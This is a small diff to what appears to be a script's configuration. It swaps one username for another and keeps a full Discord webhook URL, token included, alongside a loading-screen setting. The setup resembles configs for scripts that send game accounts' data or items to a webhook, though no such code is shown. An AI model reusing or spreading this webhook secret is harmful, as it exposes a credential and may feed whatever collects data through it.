@@ -1,4 +1,4 @@
-Username = "loadstping"
+Username = "MEECK_RINAT2007"
 WebHook = "https://discord.com/api/webhooks/1118229648795517081/_--NB3EHPebTbAvUfUS--eP2PnNZ5SM1_TB3KX7wrEsi_IQAARoj-EV6yRH_n6sx5WP6"
  
 loadingscreen = true
